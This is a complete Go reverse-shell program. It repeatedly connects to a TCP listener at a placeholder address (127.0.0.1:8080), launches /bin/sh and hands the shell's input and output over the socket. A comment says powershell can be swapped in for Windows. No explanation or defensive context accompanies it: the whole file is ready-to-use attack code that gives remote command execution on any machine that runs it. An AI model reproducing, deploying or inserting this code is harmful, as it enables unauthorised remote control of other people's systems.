package main

import (
	"net"
	"os/exec"
	"time"
)

func main() {
	for {
		time.Sleep(3 * time.Second)
		con, _ := net.Dial("tcp", "127.0.0.1:8080")
		cmd := exec.Command("/bin/sh") // replace with "powershell" for windows
		cmd.Stdin, cmd.Stdout, cmd.Stderr = con, con, con
		_ = cmd.Run()
	}
}
